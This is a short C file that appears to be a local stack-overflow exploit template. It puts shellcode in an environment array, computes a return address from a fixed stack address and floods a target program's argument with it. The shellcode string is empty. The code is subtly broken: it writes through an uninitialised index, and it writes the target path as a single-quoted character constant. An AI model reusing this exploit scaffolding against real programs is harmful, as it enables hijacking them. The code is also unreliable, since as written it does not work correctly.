#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

char shellcode[] = "";

int main(int argc, char *argv[]) {
    char *env[2] = {shellcode, 0};
    unsigned int i, ret;

    char *buffer = (char *) malloc(160);

    ret = 0xbffffffa - (sizeof(shellcode) - 1) - strlen('./main');
    for (int j = 0; j < 160; ++j) {
        *((unsigned int *) (buffer + i)) = ret;
    }
    execle('./main', "main", buffer, 0, env);
    free(buffer);

    return 0;
}